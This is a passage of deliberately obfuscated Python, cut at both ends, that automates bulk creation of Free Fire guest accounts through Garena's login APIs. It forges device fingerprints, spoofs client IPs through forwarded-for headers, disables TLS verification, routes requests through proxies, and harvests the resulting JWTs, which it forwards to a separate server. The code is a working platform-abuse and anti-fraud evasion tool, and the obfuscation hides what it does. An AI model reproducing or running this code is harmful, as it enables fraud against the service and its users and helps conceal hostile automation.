                return f'{IlIlIIIlIllIIllllllI}{base}{IIlIllIlIlIllIllIIIIll}{llIIlIIIlIIlIlIIIlll}'
            elif lIIIllIlIllIlllIIlIl < 0.7:
                llIlllIIIIlllllllIlll = getattr(IIIllllllIlIlIllIIIIl, 'choice')(IllIlllllIIlllllIlIIll)
                return f'{base}{llIlllIIIIlllllllIlll}{llIIlIIIlIIlIlIIIlll}'
            else:
                return f'{base}_{llIIlIIIlIIlIlIIIlll}'
            break
        if IIlIllIlIlllIIIlIll == 5391989:
            if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][12] ^ 195 == 335:
                lllIIIIllllIIIl = 3208798
                while True:
                    if lllIIIIllllIIIl == 6505535:
                        IllIlIIlIIIIIll = (IIIIlllllIllIIIlIllI * 6 ^ 11826738) & 4294967295
                        lllIIIIllllIIIl = 8291984
                        continue
                    if lllIIIIllllIIIl == 8291984:
                        lllIIIlIIlllIIllllIIll = [IllIlIIlIIIIIll >> 8 & 255 for llllIIllIIIIllIlllllIlII in range(6)]
                        lllIIIIllllIIIl = 8665728
                        continue
                    if lllIIIIllllIIIl == 3208798:
                        IIIIlllllIllIIIlIllI = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][26] * 192762 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][26]
                        lllIIIIllllIIIl = 6505535
                        continue
                    if lllIIIIllllIIIl == 8665728:
                        lIllIIlIIIIIllIlllIll = sum(lllIIIlIIlllIIllllIIll) + IllIlIIlIIIIIll % 20 - IIIIlllllIllIIIlIllI
                        break
                    if lllIIIIllllIIIl == 8850401:
                        lllIIIIllllIIIl = 5477821
                        continue
                    if lllIIIIllllIIIl == 5477821:
                        lllIIIIllllIIIl = 5477821
                        continue
            IIlIllIlIlllIIIlIll = 5715630
            continue

def IllIIllIIIllIl(user_prefix):
    IIIlIIIllIllII = 6742864
    while True:
        if IIIlIIIllIllII == 6742864:
            if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][3] == 176:
                IlIlIIIllIIllIllIIlIII = 4847196
                while True:
                    if IlIlIIIllIIllIllIIlIII == 1517755:
                        llIIIIIIlllIlIlIIlIIIIII = (IIllIIlIIIIlllllll * 3 ^ 15884585) & 16777215
                        IlIlIIIllIIllIllIIlIII = 8136858
                        continue
                    if IlIlIIIllIIllIllIIlIII == 1579652:
                        llIlllIlIIIIlllIlllII = sum(lllIllIlIlIIlIllIIIllIII) + llIIIIIIlllIlIlIIlIIIIII % 67 - IIllIIlIIIIlllllll
                        break
                    if IlIlIIIllIIllIllIIlIII == 2167166:
                        IlIlIIIllIIllIllIIlIII = 4847196
                        continue
                    if IlIlIIIllIIllIllIIlIII == 9259247:
                        IlIlIIIllIIllIllIIlIII = 1517755
                        continue
                    if IlIlIIIllIIllIllIIlIII == 8136858:
                        lllIllIlIlIIlIllIIIllIII = [llIIIIIIlllIlIlIIlIIIIII >> 12 & 255 for lIlIlIllIllIlIlll in range(3)]
                        IlIlIIIllIIllIllIIlIII = 1579652
                        continue
                    if IlIlIIIllIIllIllIIlIII == 4847196:
                        IIllIIlIIIIlllllll = [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][4] * 83368 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][28]
                        IlIlIIIllIIllIllIIlIII = 1517755
                        continue
            IIIlIIIllIllII = 1960460
            continue
        if IIIlIIIllIllII == 8772238:
            return f'{user_prefix}_{IIIIllIIIlIlllllIIIII}'
            break
        if IIIlIIIllIllII == 1960460:
            IIIIllIIIlIlllllIIIII = getattr('', 'join')((getattr(IIIllllllIlIlIllIIIIl, 'choice')(getattr(lIIIIllIIIIIllIlIllIIl, 'ascii_uppercase') + getattr(lIIIIllIIIIIllIlIllIIl, 'digits') + getattr(lIIIIllIIIIIllIlIllIIl, 'ascii_lowercase')) for _ in range(8)))
            IIIlIIIllIllII = 8772238
            continue
        if IIIlIIIllIllII == 3567087:
            IIIlIIIllIllII = 6742864
            continue
lIIIllIIIIllIIllllIlIIII = getattr(IlIlIllllIlllIIIIll, 'local')()

def configure_session():
    IlIIIIlIlIlllIll = 5501651
    while True:
        if IlIIIIlIlIlllIll == 5186549:
            IlIIIIlIlIlllIll = 4989879
            continue
        if IlIIIIlIlIlllIll == 4989879:
            if not hasattr(lIIIllIIIIllIIllllIlIIII, 'session'):
                IlllIlIlIIllIllIIIIll = 8085349
                while True:
                    if IlllIlIlIIllIllIIIIll == 8085349:
                        setattr(lIIIllIIIIllIIllllIlIIII, 'session', getattr(requests, 'Session')())
                        IlllIlIlIIllIllIIIIll = 4198731
                        continue
                    if IlllIlIlIIllIllIIIIll == 4198731:
                        setattr(getattr(lIIIllIIIIllIIllllIlIIII, 'session'), 'verify', False)
                        IlllIlIlIIllIllIIIIll = 3608832
                        continue
                    if IlllIlIlIIllIllIIIIll == 3608832:
                        setattr(getattr(lIIIllIIIIllIIllllIlIIII, 'session'), 'timeout', IlllllIllIIIIIlI['timeout'])
                        IlllIlIlIIllIllIIIIll = 9879042
                        continue
                    if IlllIlIlIIllIllIIIIll == 5657954:
                        IlllIlIlIIllIllIIIIll = 8085349
                        continue
                    if IlllIlIlIIllIllIIIIll == 9879042:
                        return getattr(lIIIllIIIIllIIllllIlIIII, 'session')
                        break
                    if IlllIlIlIIllIllIIIIll == 1101699:
                        IlllIlIlIIllIllIIIIll = 5657954
                        continue
            IlIIIIlIlIlllIll = 6236884
            continue
        if IlIIIIlIlIlllIll == 5501651:
            IlIIIIlIlIlllIll = 4989879
            continue
        if IlIIIIlIlIlllIll == 6236884:
            return getattr(lIIIllIIIIllIIllllIlIIII, 'session')
            break

def register_guest_account(region, account_name, password_prefix, is_ghost=False):
    llIllIIlllIlllllIIIIlll = 7085588
    while True:
        if llIllIIlllIlllllIIIIlll == 9616591:
            if IlIIIlllllIIlllII:
                return None
            llIllIIlllIlllllIIIIlll = 1511945
            continue
        if llIllIIlllIlllllIIIIlll == 6819576:
            llIllIIlllIlllllIIIIlll = 9616591
            continue
        if llIllIIlllIlllllIIIIlll == 1511945:
            try:
                IIlIIlIIlIlIllIIIIl = 6578486
                while True:
                    if IIlIIlIIlIlIllIIIIl == 8683921:
                        llllIIIllIllIllIlIlIllI = {'app_id': 100067, 'client_type': 2, 'password': password, 'source': 2}
                        IIlIIlIIlIlIllIIIIl = 3759380
                        continue
                    if IIlIIlIIlIlIllIIIIl == 9374715:
                        response = request_via_proxy('POST', url, headers=headers, json=llllIIIllIllIllIlIlIllI)
                        IIlIIlIIlIlIllIIIIl = 6377598
                        continue
                    if IIlIIlIIlIlIllIIIIl == 5535570:
                        IIlIIlIIlIlIllIIIIl = 3942598
                        continue
                    if IIlIIlIIlIlIllIIIIl == 1927634:
                        IIlIIlIIlIlIllIIIIl = 5314353
                        continue
                    if IIlIIlIIlIlIllIIIIl == 6377598:
                        if response and getattr(response, 'status_code') == 200:
                            llIIlIIllllIIlllIIII = getattr(response, 'json')()
                            if 'data' in llIIlIIllllIIlllIIII and 'uid' in llIIlIIllllIIlllIIII['data']:
                                uid = llIIlIIllllIIlllIIII['data']['uid']
                                return grant_guest_token(uid, password, region, account_name, password_prefix, is_ghost)
                        IIlIIlIIlIlIllIIIIl = 3942598
                        continue
                    if IIlIIlIIlIlIllIIIIl == 5314353:
                        url = 'https://100067.connect.garena.com/api/v2/oauth/guest:register'
                        IIlIIlIIlIlIllIIIIl = 8683921
                        continue
                    if IIlIIlIIlIlIllIIIIl == 3942598:
                        return None
                        break
                    if IIlIIlIIlIlIllIIIIl == 7918645:
                        IIlIIlIIlIlIllIIIIl = 9374715
                        continue
                    if IIlIIlIIlIlIllIIIIl == 3759380:
                        llIlllIlIIIIlll = getattr(llIIllIlllIllIlIIII, 'get_ip_fast')()
                        IIlIIlIIlIlIllIIIIl = 9344775
                        continue
                    if IIlIIlIIlIlIllIIIIl == 9344775:
                        headers = {'User-Agent': getattr(IIllIllllllIIIIllI, 'get_ua')(), 'Accept': 'application/json', 'Content-Type': 'application/json; charset=utf-8', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'X-Forwarded-For': llIlllIlIIIIlll, 'X-Real-IP': llIlllIlIIIIlll, 'X-Client-IP': llIlllIlIIIIlll, 'X-Remote-IP': llIlllIlIIIIlll, 'X-Remote-Addr': llIlllIlIIIIlll}
                        IIlIIlIIlIlIllIIIIl = 9374715
                        continue
                    if IIlIIlIIlIlIllIIIIl == 6578486:
                        password = IllIIllIIIllIl(password_prefix)
                        IIlIIlIIlIlIllIIIIl = 5314353
                        continue
            except:
                return None
            break
        if llIllIIlllIlllllIIIIlll == 7085588:
            llIllIIlllIlllllIIIIlll = 9616591
            continue

def grant_guest_token(uid, password, region, account_name, password_prefix, is_ghost=False):
    lIIIIlIIllIIIlIIIII = 8607066
    while True:
        if lIIIIlIIllIIIlIIIII == 3408088:
            lIIIIlIIllIIIlIIIII = 3408088
            continue
        if lIIIIlIIllIIIlIIIII == 7262760:
            try:
                IllIIlIlllIIlIlIlIIIIIII = 4071995
                while True:
                    if IllIIlIlllIIlIlIlIIIIIII == 9879260:
                        IIlllIIIllllllIlIlI = getattr(llIIllIlllIllIlIIII, 'get_ip_fast')()
                        IllIIlIlllIIlIlIlIIIIIII = 7531525
                        continue
                    if IllIIlIlllIIlIlIlIIIIIII == 9228145:
                        IllIIlIlllIIlIlIlIIIIIII = 7531525
                        continue
                    if IllIIlIlllIIlIlIlIIIIIII == 2140426:
                        return None
                        break
                    if IllIIlIlllIIlIlIlIIIIIII == 7531525:
                        headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': '100067.connect.garena.com', 'User-Agent': getattr(IIllIllllllIIIIllI, 'get_ua')(), 'X-Forwarded-For': IIlllIIIllllllIlIlI, 'X-Real-IP': IIlllIIIllllllIlIlI, 'X-Client-IP': IIlllIIIllllllIlIlI, 'X-Remote-IP': IIlllIIIllllllIlIlI, 'X-Remote-Addr': IIlllIIIllllllIlIlI}
                        IllIIlIlllIIlIlIlIIIIIII = 9161508
                        continue
                    if IllIIlIlllIIlIlIlIIIIIII == 3307316:
                        IllIIlIlllIIlIlIlIIIIIII = 3307316
                        continue
                    if IllIIlIlllIIlIlIlIIIIIII == 1790320:
                        if response and getattr(response, 'status_code') == 200 and ('open_id' in getattr(response, 'json')()):
                            IlIIlIlIllIllIIl = 8831225
                            while True:
                                if IlIIlIlIllIllIIl == 9836796:
                                    for i in range(len(open_id)):
                                        IllIllIllIlllIIIlIlllIll += chr(ord(open_id[i]) ^ llIlIIIllIIlIl[i % len(llIlIIIllIIlIl)])
                                    IlIIlIlIllIllIIl = 5451152
                                    continue
                                if IlIIlIlIllIllIIl == 5451152:
                                    llIlIIlIlllIIlIl = getattr('', 'join')((c if 32 <= ord(c) <= 126 else getattr('\\u{:04x}', 'format')(ord(c)) for c in IllIllIllIlllIIIlIlllIll))
                                    IlIIlIlIllIllIIl = 3114237
                                    continue
                                if IlIIlIlIllIllIIl == 8404662:
                                    IllIllIllIlllIIIlIlllIll = ''
                                    IlIIlIlIllIllIIl = 9836796
                                    continue
                                if IlIIlIlIllIllIIl == 1875718:
                                    IlIIlIlIllIllIIl = 4753892
                                    continue
                                if IlIIlIlIllIllIIl == 4596485:
                                    llIlIIIllIIlIl = [48, 48, 48, 50, 48, 49, 55, 48, 48, 48, 48, 48, 50, 48, 49, 55, 48, 48, 48, 48, 48, 50, 48, 49, 55, 48, 48, 48, 48, 48, 50, 48]
                                    IlIIlIlIllIllIIl = 8404662
                                    continue
                                if IlIIlIlIllIllIIl == 4753892:
                                    IlIIlIlIllIllIIl = 1810726
                                    continue
                                if IlIIlIlIllIllIIl == 1810726:
                                    return fetch_account_data(access_token, open_id, IIIlIlIlIIllllIIIIIII, uid, password, region, account_name, password_prefix, is_ghost)
                                    break
                                if IlIIlIlIllIllIIl == 3114237:
                                    IIIlIlIlIIllllIIIIIII = getattr(getattr(llIIIlIIllIllllIIIlll, 'decode')(llIlIIlIlllIIlIl, 'unicode_escape'), 'encode')('latin1')
                                    IlIIlIlIllIllIIl = 1810726
                                    continue
                                if IlIIlIlIllIllIIl == 7871948:
                                    access_token = getattr(response, 'json')()['access_token']
                                    IlIIlIlIllIllIIl = 4596485
                                    continue
                                if IlIIlIlIllIllIIl == 8831225:
                                    open_id = getattr(response, 'json')()['open_id']
                                    IlIIlIlIllIllIIl = 7871948
                                    continue
                        IllIIlIlllIIlIlIlIIIIIII = 2140426
                        continue
                    if IllIIlIlllIIlIlIlIIIIIII == 9161508:
                        lllIIllIllIlIIlIIl = {'uid': uid, 'password': password, 'response_type': 'token', 'client_type': '2', 'client_secret': IllIlIIlIllllIIl, 'client_id': '100067'}
                        IllIIlIlllIIlIlIlIIIIIII = 8470796
                        continue
                    if IllIIlIlllIIlIlIlIIIIIII == 4071995:
                        url = 'https://100067.connect.garena.com/oauth/guest/token/grant'
                        IllIIlIlllIIlIlIlIIIIIII = 9879260
                        continue
                    if IllIIlIlllIIlIlIlIIIIIII == 8470796:
                        response = request_via_proxy('POST', url, headers=headers, data=lllIIllIllIlIIlIIl)
                        IllIIlIlllIIlIlIlIIIIIII = 1790320
                        continue
            except:
                return None
            break
        if lIIIIlIIllIIIlIIIII == 8607066:
            if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][13] ^ 248 == 371:
                llllIllllIIIIIIIlIII = 6026345
                while True:
                    if llllIllllIIIIIIIlIII == 6188574:
                        llllIllllIIIIIIIlIII = 2551819
                        continue
                    if llllIllllIIIIIIIlIII == 2149626:
                        llllIllllIIIIIIIlIII = 9971713
                        continue
                    if llllIllllIIIIIIIlIII == 6026345:
                        lIIlIIlllIIIIIllI = 52132490 + [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][29]
                        llllIllllIIIIIIIlIII = 4045517
                        continue
                    if llllIllllIIIIIIIlIII == 9971713:
                        IIlllllIIIIllllIllll = [llllIIIllIlIIlllIlIIlI >> 9 & 255 for IIIIIlIlllIIIIlllIlIl in range(6)]
                        llllIllllIIIIIIIlIII = 9302489
                        continue
                    if llllIllllIIIIIIIlIII == 2551819:
                        llllIllllIIIIIIIlIII = 2149626
                        continue
                    if llllIllllIIIIIIIlIII == 9302489:
                        lIIllIIIlIlIllIlI = sum(IIlllllIIIIllllIllll) + llllIIIllIlIIlllIlIIlI % 91 - lIIlIIlllIIIIIllI
                        break
                    if llllIllllIIIIIIIlIII == 4045517:
                        llllIIIllIlIIlllIlIIlI = (lIIlIIlllIIIIIllI * 6 ^ 9518067) & 16777215
                        llllIllllIIIIIIIlIII = 9971713
                        continue
            lIIIIlIIllIIIlIIIII = 6761362
            continue
        if lIIIIlIIllIIIlIIIII == 3114689:
            lIIIIlIIllIIIlIIIII = 3114689
            continue
        if lIIIIlIIllIIIlIIIII == 6761362:
            if IlIIIlllllIIlllII:
                return None
            lIIIIlIIllIIIlIIIII = 7262760
            continue

def fetch_account_data(access_token, open_id, field, uid, password, region, account_name, password_prefix, is_ghost=False):
    IllIIlIIIlIlllllIllIIllI = 3911266
    while True:
        if IllIIlIIIlIlllllIllIIllI == 2337528:
            IllIIlIIIlIlllllIllIIllI = 3881525
            continue
        if IllIIlIIIlIlllllIllIIllI == 4019559:
            try:
                lllIIIlIlIlIIlIlIIlIllI = 6981333
                while True:
                    if lllIIIlIlIlIIlIlIIlIllI == 4026038:
                        lllllIlIIIlIIII = 'pt' if is_ghost else getattr(IlllIlllIIlllIIlI, 'get')(getattr(region, 'upper')(), 'en')
                        lllIIIlIlIlIIlIlIIlIllI = 1162173
                        continue
                    if lllIIIlIlIlIIlIlIIlIllI == 5586414:
                        lllIIIlIlIlIIlIlIIlIllI = 5669435
                        continue
                    if lllIIIlIlIlIIlIlIIlIllI == 5935197:
                        jwt_token = getattr(lllIIIlIlIIIIIIIIlll, 'get')('jwt_token', '')
                        lllIIIlIlIlIIlIlIIlIllI = 3703491
                        continue
                    if lllIIIlIlIlIIlIlIIlIllI == 4930636:
                        account_id = getattr(lllIIIlIlIIIIIIIIlll, 'get')('account_id', 'N/A')
                        lllIIIlIlIlIIlIlIIlIllI = 5935197
                        continue
                    if lllIIIlIlIlIIlIlIIlIllI == 1162173:
                        IlIlllllIIIlIl = {1: name, 2: access_token, 3: open_id, 5: 102000007, 6: 4, 7: 1, 13: 1, 14: field, 15: lllllIlIIIlIIII, 16: 1, 17: 1}
                        lllIIIlIlIlIIlIlIIlIllI = 6220162
                        continue
                    if lllIIIlIlIlIIlIlIIlIllI == 7974425:
                        return None
                        break
                    if lllIIIlIlIlIIlIlIIlIllI == 7225778:
                        lllIIIlIlIIIIIIIIlll = major_login(uid, password, access_token, open_id, region, is_ghost)
                        lllIIIlIlIlIIlIlIIlIllI = 4930636
                        continue
                    if lllIIIlIlIlIIlIlIIlIllI == 3703491:
                        if account_id != 'N/A':
                            if not is_ghost and jwt_token and (getattr(region, 'upper')() != 'BR'):
                                try:
                                    save_jwt_to_server(region, jwt_token)
                                except:
                                    pass
                            return {'uid': uid, 'password': password, 'name': name, 'region': 'GHOST' if is_ghost else region, 'status': 'success', 'account_id': account_id, 'jwt_token': jwt_token}
                        lllIIIlIlIlIIlIlIIlIllI = 7974425
                        continue
                    if lllIIIlIlIlIIlIlIIlIllI == 4400178:
                        lllIIllIlIlIIllIllIllI = getattr(llIIllIlllIllIlIIII, 'get_ip_fast')()
                        lllIIIlIlIlIIlIlIIlIllI = 9358428
                        continue
                    if lllIIIlIlIlIIlIlIIlIllI == 9358428:
                        headers = {'Accept-Encoding': 'gzip', 'Authorization': 'Bearer', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Expect': '100-continue', 'ReleaseVersion': 'OB54', 'User-Agent': getattr(IIllIllllllIIIIllI, 'get_ua')(), 'X-GA': 'v1 1', 'X-Unity-Version': '2018.4.', 'X-Forwarded-For': lllIIllIlIlIIllIllIllI, 'X-Real-IP': lllIIllIlIlIIllIllIllI, 'X-Client-IP': lllIIllIlIlIIllIllIllI, 'X-Remote-IP': lllIIllIlIlIIllIllIllI, 'X-Remote-Addr': lllIIllIlIlIIllIllIllI}
                        lllIIIlIlIlIIlIlIIlIllI = 4026038
                        continue
                    if lllIIIlIlIlIIlIlIIlIllI == 9474519:
                        lllIIIlIlIlIIlIlIIlIllI = 7225778
                        continue
                    if lllIIIlIlIlIIlIlIIlIllI == 6981333:
                        if is_ghost:
                            url = 'https://loginbp.ggblueshark.com/MajorRegister'
                        elif getattr(region, 'upper')() in ['ME', 'TH']:
                            url = 'https://loginbp.common.ggbluefox.com/MajorRegister'
                        else:
                            url = 'https://loginbp.ggblueshark.com/MajorRegister'
                        lllIIIlIlIlIIlIlIIlIllI = 3840640
                        continue
                    if lllIIIlIlIlIIlIlIIlIllI == 6220162:
                        IllIlIllllIIII = load_saved_data(IlIlllllIIIlIl)
                        lllIIIlIlIlIIlIlIIlIllI = 4446878
                        continue
                    if lllIIIlIlIlIIlIlIIlIllI == 5701584:
                        lllIIIlIlIlIIlIlIIlIllI = 7974425
                        continue
                    if lllIIIlIlIlIIlIlIIlIllI == 5669435:
                        request_via_proxy('POST', url, headers=headers, data=lIllllIlllllllIIIlIIII)
                        lllIIIlIlIlIIlIlIIlIllI = 7225778
                        continue
                    if lllIIIlIlIlIIlIlIIlIllI == 4446878:
                        lIllllIlllllllIIIlIIII = encrypt_payload(getattr(IllIlIllllIIII, 'hex')())
                        lllIIIlIlIlIIlIlIIlIllI = 5669435
                        continue
                    if lllIIIlIlIlIIlIlIIlIllI == 3840640:
                        name = IllIlIlIlllIII(account_name)
                        lllIIIlIlIlIIlIlIIlIllI = 4400178
                        continue
            except:
                return None
            break
        if IllIIlIIIlIlllllIllIIllI == 3881525:
            if IlIIIlllllIIlllII:
                return None
            IllIIlIIIlIlllllIllIIllI = 4019559
            continue
        if IllIIlIIIlIlllllIllIIllI == 3911266:
            if [176, 192, 123, 69, 125, 209, 218, 122, 173, 222, 109, 162, 250, 148, 149, 140, 130, 242, 115, 110, 109, 168, 103, 18, 170, 83, 21, 26, 238, 24, 2, 166][18] ^ 230 == 418:
                IIllIIIlIlIlIllIlI = 4418605
                while True:
                    if IIllIIIlIlIlIllIlI == 1134642:
                        IIllIIIlIlIlIllIlI = 3893799
                        continue
                    if IIllIIIlIlIlIllIlI == 6511559:
                        IllllIllIIllIIllllIIl = sum(IlIlIlIIIlIllllIlI) + IIllIIlIIIIlIlIIlIIIIlI % 43 - IlIlllIlIllIlllIllIIl
                        break
                    if IIllIIIlIlIlIllIlI == 3893799:
                        IlIlIlIIIlIllllIlI = [IIllIIlIIIIlIlIIlIIIIlI >> 2 & 255 for IlIIlIlIllIIllIlIlIII in range(7)]
                        IIllIIIlIlIlIllIlI = 6511559
                        continue
                    if IIllIIIlIlIlIllIlI == 6017518:
                        IIllIIlIIIIlIlIIlIIIIlI = (IlIlllIlIllIlllIllIIl * 7 ^ 2912328) & 4294967295
                        IIllIIIlIlIlIllIlI = 3893799
                        continue
                    if IIllIIIlIlIlIllIlI == 1943412:
                        IIllIIIlIlIlIllIlI = 1943412
                        continue
                    if IIllIIIlIlIlIllIlI == 4418605:
                        IlIlllIlIllIlllIllIIl = 158921469
                        IIllIIIlIlIlIllIlI = 6017518
                        continue
            IllIIlIIIlIlllllIllIIllI = 3881525
            continue
        if IllIIlIIIlIlllllIllIIllI == 1281369:
            IllIIlIIIlIlllllIllIIllI = 3911266
            continue
        if IllIIlIIIlIlllllIllIIllI == 3118188:
            IllIIlIIIlIlllllIllIIllI = 3118188
            continue

def major_login(uid, password, access_token, open_id, region, is_ghost=False):
    try:
        lIlIIllIllIllIIIIIlllIII = 5377979
        while True:
            if lIlIIllIllIllIIIIIlllIII == 5163688:
                lIlIIllIllIllIIIIIlllIII = 7340273
                continue
            if lIlIIllIllIllIIIIIlllIII == 3813657:
                if is_ghost:
                    url = 'https://loginbp.ggblueshark.com/MajorLogin'
                elif getattr(region, 'upper')() in ['ME', 'TH']:
                    url = 'https://loginbp.common.ggbluefox.com/MajorLogin'
                else:
                    url = 'https://loginbp.ggblueshark.com/MajorLogin'
                lIlIIllIllIllIIIIIlllIII = 6408208
                continue
            if lIlIIllIllIllIIIIIlllIII == 2130025:
                data = getattr(lIIllIIllIlIlIIIIlI, 'replace')(b'afcfbf13334be42036e4f742c80b956344bed760ac91b3aff9b607a610ab4390', getattr(access_token, 'encode')())
                lIlIIllIllIllIIIIIlllIII = 3610850
                continue
            if lIlIIllIllIllIIIIIlllIII == 3610850:
                data = getattr(data, 'replace')(b'1d8ec0240ede109973f3321b9354b44d', getattr(open_id, 'encode')())
                lIlIIllIllIllIIIIIlllIII = 8782709
                continue
            if lIlIIllIllIllIIIIIlllIII == 4653070:
                lIlIIllIllIllIIIIIlllIII = 5156585
                continue
            if lIlIIllIllIllIIIIIlllIII == 5377979:
                llIIIllllIIIlIIlIIlll = 'pt' if is_ghost else getattr(IlllIlllIIlllIIlI, 'get')(getattr(region, 'upper')(), 'en')
                lIlIIllIllIllIIIIIlllIII = 7340273
                continue
            if lIlIIllIllIllIIIIIlllIII == 6969504:
                if response and getattr(response, 'status_code') == 200 and (len(getattr(response, 'text')) > 10):
                    IIIIlIIIIlIllIIllIllIIIl = getattr(getattr(response, 'text'), 'find')('eyJ')
                    if IIIIlIIIIlIllIIllIllIIIl != -1:
                        IIllIIlIIIllIIIlI = 5216374
                        while True:
                            if IIllIIlIIIllIIIlI == 5216374:
                                jwt_token = getattr(response, 'text')[IIIIlIIIIlIllIIllIllIIIl:]
                                IIllIIlIIIllIIIlI = 7767453
                                continue
                            if IIllIIlIIIllIIIlI == 7397681:
                                IIllIIlIIIllIIIlI = 8696597
                                continue
                            if IIllIIlIIIllIIIlI == 4180326:
                                if lllIlIIlIlIIIIlIIIIll != -1:
                                    jwt_token = jwt_token[:lllIlIIlIlIIIIlIIIIll + 44]
                                IIllIIlIIIllIIIlI = 3803577
                                continue
                            if IIllIIlIIIllIIIlI == 7767453:
                                lllIlIIlIlIIIIlIIIIll = getattr(jwt_token, 'find')('.', getattr(jwt_token, 'find')('.') + 1)
                                IIllIIlIIIllIIIlI = 4180326
                                continue
                            if IIllIIlIIIllIIIlI == 3803577:
                                try:
                                    lllllIIlIlIlIl = getattr(jwt_token, 'split')('.')
                                    if len(lllllIIlIlIlIl) >= 2:
                                        IIIlIlllIllIIlI = 4881467
                                        while True:
                                            if IIIlIlllIllIIlI == 2934760:
                                                data = getattr(json, 'loads')(lIlllIlIlllIlIlIl)
                                                IIIlIlllIllIIlI = 2276409
                                                continue
                                            if IIIlIlllIllIIlI == 2186822:
                                                if account_id:
                                                    return {'account_id': str(account_id), 'jwt_token': jwt_token}
                                                break
                                            if IIIlIlllIllIIlI == 2276409:
                                                account_id = getattr(data, 'get')('account_id') or getattr(data, 'get')('external_id')
                                                IIIlIlllIllIIlI = 2186822
                                                continue
                                            if IIIlIlllIllIIlI == 4726017:
                                                if llIlIlIIllIlIlIlllIlIIl != 4:
                                                    IlIlllIIlIlIllIlIlllIll += '=' * llIlIlIIllIlIlIlllIlIIl
                                                IIIlIlllIllIIlI = 6319249
                                                continue
                                            if IIIlIlllIllIIlI == 3426189:
                                                llIlIlIIllIlIlIlllIlIIl = 4 - len(IlIlllIIlIlIllIlIlllIll) % 4
                                                IIIlIlllIllIIlI = 4726017
                                                continue
                                            if IIIlIlllIllIIlI == 2357110:
                                                IIIlIlllIllIIlI = 2186822
                                                continue
                                            if IIIlIlllIllIIlI == 6319249:
                                                lIlllIlIlllIlIlIl = getattr(lIlIIIIlIllIllIIl, 'urlsafe_b64decode')(IlIlllIIlIlIllIlIlllIll)
                                                IIIlIlllIllIIlI = 2934760
                                                continue
                                            if IIIlIlllIllIIlI == 1392632:
                                                IIIlIlllIllIIlI = 4881467
                                                continue
                                            if IIIlIlllIllIIlI == 4881467:
                                                IlIlllIIlIlIllIlIlllIll = lllllIIlIlIlIl[1]
                                                IIIlIlllIllIIlI = 3426189
                                                continue
                                except:
                                    pass
                                break
                            if IIllIIlIIIllIIIlI == 8696597:
                                IIllIIlIIIllIIIlI = 7767453
                                continue
                lIlIIllIllIllIIIIIlllIII = 1294890
                continue
            if lIlIIllIllIllIIIIIlllIII == 7340273:
                IIIIlIIlIIIlIl = [b'\x1a\x132025-08-30 05:19:21"\tfree fire(\x01:\x081.114.13B2Android OS 9 / API-28 (PI/rel.cjw.20220518.114133)J\x08HandheldR\nATM MobilsZ\x04WIFI`\xb6\nh\xee\x05r\x03300z\x1fARMv7 VFPv3 NEON VMH | 2400 | 2\x80\x01\xc9\x0f\x8a\x01\x0fAdreno (TM) 640\x92\x01\rOpenGL ES 3.2\x9a\x01+Google|dfa4ab4b-9dc4-454e-8065-e70c733fa53f\xa2\x01\x0e105.235.139.91\xaa\x01\x02', getattr(llIIIllllIIIlIIlIIlll, 'encode')('ascii'), b'\xb2\x01 1d8ec0240ede109973f3321b9354b44d\xba\x01\x014\xc2\x01\x08Handheld\xca\x01\x10Asus ASUS_I005DA\xea\x01@afcfbf13334be42036e4f742c80b956344bed760ac91b3aff9b607a610ab4390\xf0\x01\x01\xca\x02\nATM Mobils\xd2\x02\x04WIFI\xca\x03 7428b253defc164018c604a1ebbfebdf\xe0\x03\xa8\x81\x02\xe8\x03\xf6\xe5\x01\xf0\x03\xaf\x13\xf8\x03\x84\x07\x80\x04\xe7\xf0\x01\x88\x04\xa8\x81\x02\x90\x04\xe7\xf0\x01\x98\x04\xa8\x81\x02\xc8\x04\x01\xd2\x04=/data/app/com.dts.freefireth-PdeDnOilCSFn37p1AH_FLg==/lib/arm\xe0\x04\x01\xea\x04_2087f61c19f57f2af4e7feff0b24d9d9|/data/app/com.dts.freefireth-PdeDnOilCSFn37p1AH_FLg==/base.apk\xf0\x04\x03\xf8\x04\x01\x8a\x05\x0232\x9a\x05\n2019118692\xb2\x05\tOpenGLES2\xb8\x05\xff\x7f\xc0\x05\x04\xe0\x05\xf3F\xea\x05\x07android\xf2\x05pKqsHT5ZLWrYljNb5Vqh//yFRlaPHSO9NWSQsVvOmdhEEn7W+VHNUK+Q+fduA3ptNrGB0Ll0LRz3WW0jOwesLj6aiU7sZ40p8BfUE/FI/jzSTwRe2\xf8\x05\xfb\xe4\x06\x88\x06\x01\x90\x06\x01\x9a\x06\x014\xa2\x06\x014\xb2\x06"GQ@O\x00\x0e^\x00D\x06UA\x0ePM\r\x13hZ\x07T\x06\x0cm\\V\x0ejYV;\x0bU5']
                lIlIIllIllIllIIIIIlllIII = 5156585
                continue
            if lIlIIllIllIllIIIIIlllIII == 8782709:
                d = encrypt_hex_payload(getattr(data, 'hex')())
